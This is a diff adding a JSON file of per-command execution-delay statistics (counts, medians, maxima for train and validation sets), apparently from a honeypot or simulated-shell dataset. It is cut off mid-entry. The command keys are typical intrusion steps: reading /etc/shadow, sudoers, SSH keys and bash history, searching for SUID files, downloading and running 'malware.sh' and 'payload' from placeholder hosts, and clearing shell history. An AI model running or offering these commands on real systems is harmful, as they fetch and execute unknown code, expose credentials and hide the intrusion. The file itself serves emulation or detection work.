@@ -1,0 +1,2702 @@
+{
+  "execution_delay_s_by_command": {
+    "who": {
+      "train": {
+        "n": 198,
+        "median": 0.047,
+        "max": 0.141
+      },
+      "validation": {
+        "n": 78,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "free -m": {
+      "train": {
+        "n": 213,
+        "median": 0.047,
+        "max": 0.093
+      },
+      "validation": {
+        "n": 71,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ps aux": {
+      "train": {
+        "n": 225,
+        "median": 0.047,
+        "max": 0.094
+      },
+      "validation": {
+        "n": 103,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "pwd": {
+      "train": {
+        "n": 230,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 79,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ls": {
+      "train": {
+        "n": 156,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 72,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "service ssh status": {
+      "train": {
+        "n": 111,
+        "median": 0.047,
+        "max": 0.078
+      },
+      "validation": {
+        "n": 46,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cat /etc/hosts": {
+      "train": {
+        "n": 58,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 23,
+        "median": 0.047,
+        "max": 0.156
+      }
+    },
+    "nc -zv 192.0.2.5 22": {
+      "train": {
+        "n": 12,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 11,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cat ~/.ssh/config": {
+      "train": {
+        "n": 56,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 28,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "w": {
+      "train": {
+        "n": 351,
+        "median": 0.047,
+        "max": 0.109
+      },
+      "validation": {
+        "n": 157,
+        "median": 0.047,
+        "max": 0.109
+      }
+    },
+    "nmap -sn 192.0.2.0/24": {
+      "train": {
+        "n": 81,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 34,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "uptime": {
+      "train": {
+        "n": 181,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 63,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "du -sh /var/log": {
+      "train": {
+        "n": 171,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 81,
+        "median": 0.047,
+        "max": 0.094
+      }
+    },
+    "date": {
+      "train": {
+        "n": 124,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 39,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ps aux | grep sshd": {
+      "train": {
+        "n": 202,
+        "median": 0.047,
+        "max": 0.078
+      },
+      "validation": {
+        "n": 93,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cat /etc/os-release": {
+      "train": {
+        "n": 100,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 51,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "uname -a": {
+      "train": {
+        "n": 151,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 58,
+        "median": 0.047,
+        "max": 0.093
+      }
+    },
+    "systemctl status ssh": {
+      "train": {
+        "n": 106,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 42,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "clear": {
+      "train": {
+        "n": 99,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 37,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ls -la /var/log | tail -n 5": {
+      "train": {
+        "n": 95,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 43,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "df -h": {
+      "train": {
+        "n": 217,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 88,
+        "median": 0.047,
+        "max": 0.11
+      }
+    },
+    "service cron status": {
+      "train": {
+        "n": 116,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 57,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ip route": {
+      "train": {
+        "n": 80,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 32,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cat ~/.bash_history | grep ssh": {
+      "train": {
+        "n": 51,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 21,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "ping -c 2 198.51.100.10": {
+      "train": {
+        "n": 26,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "id": {
+      "train": {
+        "n": 273,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 133,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "hostname": {
+      "train": {
+        "n": 125,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 48,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "tail -n 50 /var/log/syslog": {
+      "train": {
+        "n": 88,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 35,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "curl -I http://pkg-repo.example/": {
+      "train": {
+        "n": 26,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 19,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cat /proc/cpuinfo": {
+      "train": {
+        "n": 72,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 21,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "cd /dev/shm": {
+      "train": {
+        "n": 45,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 14,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget http://mirror.example/update.sh": {
+      "train": {
+        "n": 7,
+        "median": 0.062,
+        "max": 0.063
+      }
+    },
+    "chmod +x update.sh": {
+      "train": {
+        "n": 25,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 8,
+        "median": 0.054,
+        "max": 0.063
+      }
+    },
+    "sh update.sh": {
+      "train": {
+        "n": 24,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 6,
+        "median": 0.062,
+        "max": 0.078
+      }
+    },
+    "cd /tmp": {
+      "train": {
+        "n": 34,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget http://mirror.example/payload": {
+      "train": {
+        "n": 7,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "enable": {
+      "train": {
+        "n": 35,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 19,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "chmod 777 payload": {
+      "train": {
+        "n": 22,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 15,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "sh payload": {
+      "train": {
+        "n": 25,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 10,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "rm payload": {
+      "train": {
+        "n": 13,
+        "median": 0.047,
+        "max": 0.062
+      },
+      "validation": {
+        "n": 10,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget -q http://files.example/b.sh -O b.sh": {
+      "train": {
+        "n": 10,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "chmod +x b.sh": {
+      "train": {
+        "n": 26,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 10,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "sh b.sh": {
+      "train": {
+        "n": 20,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 10,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "shell": {
+      "train": {
+        "n": 43,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 15,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "rm -rf b.sh": {
+      "train": {
+        "n": 21,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "system": {
+      "train": {
+        "n": 34,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 10,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "whoami": {
+      "train": {
+        "n": 156,
+        "median": 0.047,
+        "max": 0.078
+      },
+      "validation": {
+        "n": 72,
+        "median": 0.047,
+        "max": 0.109
+      }
+    },
+    "cat /etc/hosts | grep -v '^#'": {
+      "train": {
+        "n": 48,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 16,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cat ~/.ssh/known_hosts": {
+      "train": {
+        "n": 51,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 19,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "nc -zv 203.0.113.8 22": {
+      "train": {
+        "n": 29,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ls -la ~/.ssh": {
+      "train": {
+        "n": 79,
+        "median": 0.047,
+        "max": 0.078
+      },
+      "validation": {
+        "n": 34,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cat /etc/apt/sources.list": {
+      "train": {
+        "n": 89,
+        "median": 0.047,
+        "max": 0.11
+      },
+      "validation": {
+        "n": 35,
+        "median": 0.047,
+        "max": 0.094
+      }
+    },
+    "uname -r": {
+      "train": {
+        "n": 157,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 68,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ifconfig": {
+      "train": {
+        "n": 40,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 10,
+        "median": 0.062,
+        "max": 0.063
+      }
+    },
+    "curl -s http://files.example/ip": {
+      "train": {
+        "n": 11,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 4,
+        "median": 0.054,
+        "max": 0.063
+      }
+    },
+    "groups": {
+      "train": {
+        "n": 112,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 42,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "sudo -l": {
+      "train": {
+        "n": 95,
+        "median": 0.047,
+        "max": 0.203
+      },
+      "validation": {
+        "n": 41,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ls -la": {
+      "train": {
+        "n": 113,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 53,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ls -la /usr/bin | grep rws": {
+      "train": {
+        "n": 57,
+        "median": 0.156,
+        "max": 0.157
+      },
+      "validation": {
+        "n": 20,
+        "median": 0.148,
+        "max": 0.157
+      }
+    },
+    "ls -la /etc/shadow": {
+      "train": {
+        "n": 32,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 16,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cd /tmp || cd /var/tmp": {
+      "train": {
+        "n": 91,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 31,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget http://pkg-repo.example/update.sh": {
+      "train": {
+        "n": 4,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 2,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "chmod 777 update.sh": {
+      "train": {
+        "n": 23,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 9,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "./update.sh": {
+      "train": {
+        "n": 24,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 11,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "rm update.sh": {
+      "train": {
+        "n": 19,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 6,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "nc -zv 198.51.100.10 22": {
+      "train": {
+        "n": 17,
+        "median": 0.047,
+        "max": 0.062
+      },
+      "validation": {
+        "n": 5,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "cat /etc/group": {
+      "train": {
+        "n": 46,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 19,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ip a": {
+      "train": {
+        "n": 29,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 12,
+        "median": 0.054,
+        "max": 0.063
+      }
+    },
+    "nproc": {
+      "train": {
+        "n": 17,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 11,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cat /proc/version": {
+      "train": {
+        "n": 93,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 38,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cat /etc/passwd | grep sh": {
+      "train": {
+        "n": 44,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 20,
+        "median": 0.054,
+        "max": 0.063
+      }
+    },
+    "ss -tulpn": {
+      "train": {
+        "n": 33,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 14,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "curl -s http://pkg-repo.example/ip": {
+      "train": {
+        "n": 9,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "wget -q http://pkg-repo.example/b.sh -O b.sh": {
+      "train": {
+        "n": 5,
+        "median": 0.047,
+        "max": 0.062
+      },
+      "validation": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "./b.sh": {
+      "train": {
+        "n": 32,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 6,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "uname -m": {
+      "train": {
+        "n": 66,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 27,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget http://mirror.example/b.sh": {
+      "train": {
+        "n": 6,
+        "median": 0.062,
+        "max": 0.063
+      }
+    },
+    "echo ok": {
+      "train": {
+        "n": 28,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cat /etc/sudoers": {
+      "train": {
+        "n": 80,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 28,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ls -la /root/.ssh": {
+      "train": {
+        "n": 37,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 19,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ls -la /etc/cron.d": {
+      "train": {
+        "n": 32,
+        "median": 0.047,
+        "max": 0.282
+      },
+      "validation": {
+        "n": 13,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "cat /etc/issue": {
+      "train": {
+        "n": 35,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 15,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "arp -a": {
+      "train": {
+        "n": 41,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 23,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ss -tan": {
+      "train": {
+        "n": 31,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 13,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cat ~/.bash_history": {
+      "train": {
+        "n": 58,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 21,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "netstat -antp": {
+      "train": {
+        "n": 79,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 26,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cat /etc/resolv.conf": {
+      "train": {
+        "n": 26,
+        "median": 0.047,
+        "max": 0.078
+      },
+      "validation": {
+        "n": 11,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "wget -qO- http://mirror.example/ip": {
+      "train": {
+        "n": 11,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 2,
+        "median": 0.054,
+        "max": 0.063
+      }
+    },
+    "ping -c 2 203.0.113.8": {
+      "train": {
+        "n": 15,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 6,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "cat /etc/passwd": {
+      "train": {
+        "n": 50,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 19,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget -qO- http://pkg-repo.example/ip": {
+      "train": {
+        "n": 10,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "journalctl -n 20": {
+      "train": {
+        "n": 98,
+        "median": 0.047,
+        "max": 0.125
+      },
+      "validation": {
+        "n": 42,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "cd /var/tmp": {
+      "train": {
+        "n": 25,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 18,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget -q http://mirror.example/b.sh -O b.sh": {
+      "train": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 5,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ping -c 2 192.0.2.5": {
+      "train": {
+        "n": 14,
+        "median": 0.054,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.109
+      }
+    },
+    "find / -perm -u=s -type f 2>/dev/null": {
+      "train": {
+        "n": 53,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 13,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ls -la /etc/passwd": {
+      "train": {
+        "n": 38,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 20,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget http://files.example/b.sh": {
+      "train": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.047
+      },
+      "validation": {
+        "n": 2,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "chmod 777 b.sh": {
+      "train": {
+        "n": 26,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 6,
+        "median": 0.054,
+        "max": 0.063
+      }
+    },
+    "lscpu": {
+      "train": {
+        "n": 18,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 5,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "curl -s http://mirror.example/ip": {
+      "train": {
+        "n": 13,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 5,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "curl -I http://mirror.example/": {
+      "train": {
+        "n": 30,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 14,
+        "median": 0.054,
+        "max": 0.063
+      }
+    },
+    "curl -O http://mirror.example/update.sh": {
+      "train": {
+        "n": 9,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 2,
+        "median": 0.055,
+        "max": 0.063
+      }
+    },
+    "find / -name id_rsa 2>/dev/null": {
+      "train": {
+        "n": 30,
+        "median": 11.665,
+        "max": 13.531
+      },
+      "validation": {
+        "n": 9,
+        "median": 11.578,
+        "max": 12.11
+      }
+    },
+    "history -c": {
+      "train": {
+        "n": 30,
+        "median": 0.047,
+        "max": 0.062
+      },
+      "validation": {
+        "n": 13,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget -q http://mirror.example/malware.sh -O malware.sh": {
+      "train": {
+        "n": 4,
+        "median": 0.047,
+        "max": 0.062
+      },
+      "validation": {
+        "n": 2,
+        "median": 0.062,
+        "max": 0.063
+      }
+    },
+    "chmod 777 malware.sh": {
+      "train": {
+        "n": 28,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 6,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "sh malware.sh": {
+      "train": {
+        "n": 24,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "rm malware.sh": {
+      "train": {
+        "n": 14,
+        "median": 0.054,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "curl -O http://files.example/malware.sh": {
+      "train": {
+        "n": 7,
+        "median": 0.047,
+        "max": 0.062
+      },
+      "validation": {
+        "n": 1,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "./malware.sh": {
+      "train": {
+        "n": 23,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 7,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "curl -O http://files.example/payload": {
+      "train": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "curl -O http://files.example/b.sh": {
+      "train": {
+        "n": 5,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 2,
+        "median": 0.055,
+        "max": 0.063
+      }
+    },
+    "rm b.sh": {
+      "train": {
+        "n": 15,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 5,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "curl -I http://files.example/": {
+      "train": {
+        "n": 24,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 12,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget -q http://mirror.example/update.sh -O update.sh": {
+      "train": {
+        "n": 6,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 3,
+        "median": 0.062,
+        "max": 0.062
+      }
+    },
+    "cat /etc/shadow": {
+      "train": {
+        "n": 51,
+        "median": 0.047,
+        "max": 0.094
+      },
+      "validation": {
+        "n": 20,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "crontab -l": {
+      "train": {
+        "n": 27,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "nc -zv 192.0.2.12 22": {
+      "train": {
+        "n": 18,
+        "median": 0.047,
+        "max": 0.062
+      },
+      "validation": {
+        "n": 5,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "rm -rf update.sh": {
+      "train": {
+        "n": 11,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 7,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget http://files.example/update.sh": {
+      "train": {
+        "n": 4,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 1,
+        "median": 0.046,
+        "max": 0.046
+      }
+    },
+    "wget -q http://files.example/payload -O payload": {
+      "train": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 1,
+        "median": 0.062,
+        "max": 0.062
+      }
+    },
+    "chmod +x payload": {
+      "train": {
+        "n": 26,
+        "median": 0.047,
+        "max": 0.062
+      },
+      "validation": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "cat /etc/crontab": {
+      "train": {
+        "n": 26,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 15,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "find / -perm -4000 -type f 2>/dev/null": {
+      "train": {
+        "n": 36,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 23,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "rm -rf payload": {
+      "train": {
+        "n": 23,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 7,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "ping -c 2 192.0.2.12": {
+      "train": {
+        "n": 12,
+        "median": 0.047,
+        "max": 0.047
+      },
+      "validation": {
+        "n": 7,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "rm -rf malware.sh": {
+      "train": {
+        "n": 13,
+        "median": 0.047,
+        "max": 0.047
+      },
+      "validation": {
+        "n": 4,
+        "median": 0.063,
+        "max": 0.063
+      }
+    },
+    "curl -O http://pkg-repo.example/update.sh": {
+      "train": {
+        "n": 9,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "unset HISTFILE": {
+      "train": {
+        "n": 21,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 8,
+        "median": 0.062,
+        "max": 0.063
+      }
+    },
+    "curl -O http://mirror.example/b.sh": {
+      "train": {
+        "n": 7,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget -q http://files.example/malware.sh -O malware.sh": {
+      "train": {
+        "n": 9,
+        "median": 0.047,
+        "max": 0.109
+      },
+      "validation": {
+        "n": 1,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "wget -qO- http://files.example/ip": {
+      "train": {
+        "n": 6,
+        "median": 0.062,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 4,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "wget -q http://mirror.example/payload -O payload": {
+      "train": {
+        "n": 5,
+        "median": 0.047,
+        "max": 0.062
+      },
+      "validation": {
+        "n": 4,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "./payload": {
+      "train": {
+        "n": 23,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 13,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "curl -O http://mirror.example/malware.sh": {
+      "train": {
+        "n": 7,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "chmod +x malware.sh": {
+      "train": {
+        "n": 19,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 9,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget http://pkg-repo.example/payload": {
+      "train": {
+        "n": 6,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 1,
+        "median": 0.062,
+        "max": 0.062
+      }
+    },
+    "wget http://mirror.example/malware.sh": {
+      "train": {
+        "n": 7,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 1,
+        "median": 0.046,
+        "max": 0.046
+      }
+    },
+    "curl -O http://mirror.example/payload": {
+      "train": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.047
+      },
+      "validation": {
+        "n": 5,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "curl -O http://pkg-repo.example/malware.sh": {
+      "train": {
+        "n": 4,
+        "median": 0.047,
+        "max": 0.047
+      },
+      "validation": {
+        "n": 2,
+        "median": 0.054,
+        "max": 0.062
+      }
+    },
+    "wget http://pkg-repo.example/b.sh": {
+      "train": {
+        "n": 5,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 1,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "wget -q http://pkg-repo.example/payload -O payload": {
+      "train": {
+        "n": 7,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 2,
+        "median": 0.054,
+        "max": 0.062
+      }
+    },
+    "wget http://files.example/payload": {
+      "train": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 1,
+        "median": 0.062,
+        "max": 0.062
+      }
+    },
+    "curl -O http://files.example/update.sh": {
+      "train": {
+        "n": 4,
+        "median": 0.055,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 2,
+        "median": 0.054,
+        "max": 0.062
+      }
+    },
+    "wget http://pkg-repo.example/malware.sh": {
+      "train": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.047
+      },
+      "validation": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "wget -q http://pkg-repo.example/update.sh -O update.sh": {
+      "train": {
+        "n": 4,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 2,
+        "median": 0.047,
